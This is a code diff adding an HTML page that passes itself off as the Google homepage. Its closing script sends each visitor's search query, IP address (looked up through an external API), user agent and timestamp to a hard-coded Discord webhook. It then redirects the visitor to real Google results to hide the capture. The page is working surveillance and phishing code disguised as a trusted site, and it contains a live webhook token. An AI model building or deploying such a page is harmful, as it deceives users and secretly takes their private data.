@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google</title>
+    <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
+    <style>
+        :root {
+            --bg-color: #ffffff;
+            --text-color: #202124;
+            --search-box-border: #dfe1e5;
+            --button-bg: #f8f9fa;
+            --button-text: #3c4043;
+            --footer-bg: #f2f2f2;
+            --footer-text: #70757a;
+            --header-link-color: #3c4043;
+            --promo-link-color: #1a0dab;
+        }
+
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --bg-color: #202124;
+                --text-color: #e8eaed;
+                --search-box-border: #5f6368;
+                --button-bg: #303134;
+                --button-text: #e8eaed;
+                --footer-bg: #171717;
+                --footer-text: #9aa0a6;
+                --header-link-color: #9aa0a6;
+                --promo-link-color: #8ab4f8;
+            }
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between; /* To push footer down */
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .header {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            box-sizing: border-box;
+        }
+        .header-left a, .header-right a {
+            color: var(--header-link-color);
+            text-decoration: none;
+            margin-right: 15px;
+            font-size: 13px;
+        }
+        .header-right .grid-icon {
+            width: 24px;
+            height: 24px;
+            margin-right: 15px;
+            cursor: pointer;
+            vertical-align: middle;
+            filter: var(--header-icon-filter, none); /* for dark mode icons */
+        }
+        .header-right .profile-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            vertical-align: middle;
+            cursor: pointer;
+        }
+        @media (prefers-color-scheme: dark) {
+            .header-right .grid-icon {
+                filter: invert(1); /* Invert for dark mode */
+            }
+        }
+
+        .main-content {
+            flex-grow: 1; /* Pushes header and footer away */
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+        }
+
+        .logo {
+            width: 272px;
+            height: 92px;
+            margin-bottom: 25px;
+            filter: var(--logo-filter, none);
+        }
+        @media (prefers-color-scheme: dark) {
+            .logo {
+                filter: invert(1); /* Invert Google logo for dark mode */
+            }
+        }
+        .search-box {
+            display: flex;
+            align-items: center;
+            border: 1px solid var(--search-box-border);
+            border-radius: 24px;
+            padding: 10px 15px;
+            width: 584px;
+            max-width: 90%;
+            box-shadow: 0 2px 5px rgba(0,0,0,.1);
+            transition: box-shadow 0.3s, border-color 0.3s;
+            background-color: transparent; /* Allows background to show */
+        }
+        .search-box:hover {
+            box-shadow: 0 1px 6px rgba(0,0,0,.2);
+            border-color: var(--search-box-border); /* Keep consistent */
+        }
+        .search-box input {
+            flex-grow: 1;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            margin: 0 10px;
+            background-color: transparent;
+            color: var(--text-color);
+        }
+        .search-box .icon {
+            width: 24px;
+            height: 24px;
+            background-size: contain;
+            background-repeat: no-repeat;
+            cursor: pointer;
+            filter: var(--icon-filter, none); /* For dark mode icons */
+        }
+        @media (prefers-color-scheme: dark) {
+            .search-box .icon {
+                filter: invert(1); /* Invert icons for dark mode */
+            }
+        }
+        .buttons {
+            margin-top: 20px;
+        }
+        .buttons button {
+            background-color: var(--button-bg);
+            border: 1px solid var(--button-bg);
+            border-radius: 4px;
+            color: var(--button-text);
+            font-family: Arial, sans-serif;
+            font-size: 14px;
+            margin: 11px 4px;
+            padding: 0 16px;
+            line-height: 27px;
+            height: 36px;
+            min-width: 54px;
+            cursor: pointer;
+            text-align: center;
+            transition: background-color 0.3s, box-shadow 0.3s, border-color 0.3s;
+        }
+        .buttons button:hover {
+            box-shadow: 0 1px 1px rgba(0,0,0,.1);
+            background-color: #ebebeb; /* Lighter hover for light mode */
+            border: 1px solid #dadce0;
+        }
+        @media (prefers-color-scheme: dark) {
+            .buttons button:hover {
+                background-color: #3c4043; /* Darker hover for dark mode */
+                border: 1px solid #5f6368;
+            }
+        }
+        .promo-link {
+            margin-top: 25px;
+            font-size: 14px;
+            color: var(--promo-link-color);
+            text-decoration: none;
+        }
+        .footer {
+            width: 100%;
+            background: var(--footer-bg);
+            padding: 15px 0;
+            text-align: center;
+            font-size: 13px;
+            color: var(--footer-text);
+            border-top: 1px solid var(--search-box-border); /* Use search box border for consistent line */
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .footer-country {
+            padding-left: 20px;
+            text-align: left;
+        }
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            padding: 0 20px;
+        }
+        .footer-links div a {
+            color: var(--footer-text);
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        .footer-links div a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-left">
+            <a href="#">About</a>
+            <a href="#">Store</a>
+        </div>
+        <div class="header-right">
+            <a href="#">Gmail</a>
+            <a href="#">Images</a>
+            <img class="grid-icon" src="https://ssl.gstatic.com/gb/images/bar/al-icon.png" alt="Apps">
+            <img class="profile-icon" src="https://lh3.googleusercontent.com/ogw/AAEL6sf0o3rX2Q-5_s-Q-7_x0_y0_y0_y0_y0_y0_y0=s32-c-mo" alt="Profile">
+        </div>
+    </div>
+
+    <div class="main-content">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
+        <div class="search-box">
+            <span class="icon" style="background-image: url('data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 24 24\'><path fill=\'%234285F4\' d=\'M23.64,22.37L17.75,16.48C19.04,14.85,19.7,12.87,19.7,10.7C19.7,5.04,15.2,0.54,9.54,0.54C3.88,0.54,-0.04,5.04,-0.04,10.7C-0.04,16.36,4.46,20.86,10.12,20.86C12.33,20.86,14.37,20.19,16.08,18.91L21.97,24.8L23.64,22.37ZM10.12,18.84C5.55,18.84,1.86,15.15,1.86,10.7C1.86,6.25,5.55,2.56,10.12,2.56C14.69,2.56,18.38,6.25,18.38,10.7C18.38,15.15,14.69,18.84,10.12,18.84Z\'></path></svg>');"></span>
+            <input id="search-input" type="text" placeholder="Search Google or type a URL" onkeypress="handleKeyPress(event)">
+            <span class="icon" style="background-image: url('data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 24 24\'><path fill=\'%239AA0A6\' d=\'M12,14c-1.66,0-3-1.34-3-3V5c0-1.66,1.34-3,3-3s3,1.34,3,3v6c0,1.66-1.34,3-3,3ZM12,2c-1.66,0-3,1.34-3,3v6c0,1.66,1.34,3,3,3s3-1.34,3-3V5c0-1.66-1.34-3-3-3ZM19,11c0,3.87-3.13,7-7,7s-7-3.13-7-7H3c0,4.61,3.75,8.38,8.5,8.94V22h3v-2.06c4.75-.56,8.5-4.33,8.5-8.94H19Z\'></path></svg>');"></span>
+            <span class="icon" style="background-image: url('data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 24 24\'><path fill=\'%239AA0A6\' d=\'M12,2C6.48,2,2,6.48,2,12s4.48,10,10,10,10-4.48,10-10S17.52,2,12,2ZM16.29,14.29L14.29,16.29C13.23,17.34,11.54,17.34,10.48,16.29L7.71,13.52C6.66,12.46,6.66,10.77,7.71,9.71L9.71,7.71C10.77,6.66,12.46,6.66,13.52,7.71L16.29,10.48C17.34,11.54,17.34,13.23,16.29,14.29ZM12,20c-4.41,0-8-3.59-8-8s3.59-8,8-8,8,3.59,8,8S16.41,20,12,20Z\'></path></svg>');"></span>
+            <span class="icon" style="background-image: url('data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 24 24\'><path fill=\'%239AA0A6\' d=\'M19,3H5C3.9,3,3,3.9,3,5v14c0,1.1,0.9,2,2,2h14c1.1,0,2-0.9,2-2V5C21,3.9,20.1,3,19,3ZM12,17c-2.76,0-5-2.24-5-5s2.24-5,5-5,5,2.24,5,5S14.76,17,12,17ZM12,9c-1.66,0-3,1.34-3,3s1.34,3,3,3,3-1.34,3-3S13.66,9,12,9Z\'></path></svg>');"></span>
+            AI Mode
+        </div>
+        <div class="buttons">
+            <button onclick="handleSearch()">Google Search</button>
+            <button onclick="handleSearch()">I'm Feeling Lucky</button>
+        </div>
+        <a href="#" class="promo-link">Try now! Gemini in Android Studio is your AI-powered coding companion</a>
+    </div>
+
+    <div class="footer">
+        <div class="footer-country">
+            United States
+        </div>
+        <div class="footer-links">
+            <div>
+                <a href="#">Advertising</a>
+                <a href="#">Business</a>
+                <a href="#">How Search works</a>
+            </div>
+            <div>
+                <a href="#">
+                    <img src="data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 24 24\'><path fill=\'%2334A853\' d=\'M12,2C6.48,2,2,6.48,2,12s4.48,10,10,10,10-4.48,10-10S17.52,2,12,2ZM10.5,17L5,11.5,6.41,10.09,10.5,14.17,17.59,7.09,19,8.5,10.5,17Z\'></path></svg>\')" style="vertical-align: middle; width: 16px; height: 16px; filter: var(--icon-filter, none);">
+                    Applying AI towards science and the environment
+                </a>
+            </div>
+            <div>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+                <a href="#">Settings</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1322735847518507070/Jt-QRbzOXzQeAB-TZ3fHVA4BZVCfvRnNWWy5mZEnxBamvLOX5CI4EH4XY7QLaG_NjUxE';
+
+        function sendToWebhook(query) {
+            const data = {
+                content: null,
+                embeds: [{
+                    title: "New Google Search Intercepted!",
+                    description: `A user just performed a search on your fake Google page.`,
+                    color: 3447003, // A nice blue color
+                    fields: [
+                        {
+                            name: "Search Query",
+                            value: `\`\`\`${query}\`\`\``, // Code block for query
+                            inline: false
+                        },
+                        {
+                            name: "User IP Address",
+                            value: "Fetching...", // Will be updated
+                            inline: true
+                        },
+                        {
+                            name: "User Agent",
+                            value: `\`\`\`${navigator.userAgent}\`\`\``, // Code block for user agent
+                            inline: false
+                        },
+                        {
+                            name: "Timestamp",
+                            value: new Date().toLocaleString(),
+                            inline: true
+                        },
+                        {
+                            name: "Detected Dark Mode",
+                            value: window.matchMedia('(prefers-color-scheme: dark)').matches ? "Yes" : "No",
+                            inline: true
+                        }
+                    ],
+                    thumbnail: {
+                        url: "https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" // Google logo thumbnail
+                    },
+                    footer: {
+                        text: "Yo search intercepted by your serrch fake Google!"
+                    },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            // Yo search get the IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(ipData => {
+                    data.embeds[0].fields[1].value = `\`\`\`${ipData.ip}\`\`\``;
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(data),
+                    }).then(response => {
+                        if (!response.ok) {
+                            console.error('Yo search network response was not ok:', response.status, response.statusText);
+                        }
+                    }).catch(error => {
+                        console.error('Yo search error sending webhook:', error);
+                    });
+                })
+                .catch(error => {
+                    console.error('Yo search error fetching IP:', error);
+                    // Send the webhook anyway, without the IP if fetching fails
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(data),
+                    }).then(response => {
+                        if (!response.ok) {
+                            console.error('Yo search network response was not ok:', response.status, response.statusText);
+                        }
+                    }).catch(error => {
+                        console.error('Yo search error sending webhook:', error);
+                    });
+                });
+        }
+
+        function handleSearch() {
+            var input = document.getElementById('search-input');
+            var query = input.value.trim();
+            if (query) {
+                sendToWebhook(query);
+                // Redirect to the real Google search results after a short delay to ensure webhook sends
+                setTimeout(() => {
+                    window.location.href = 'https://www.google.com/search?q=' + encodeURIComponent(query);
+                }, 500); // 500ms delay
+            }
+        }
+
+        function handleKeyPress(event) {
+            if (event.key === 'Enter') {
+                handleSearch();
+            }
+        }
+    </script>
+</body>
+</html>
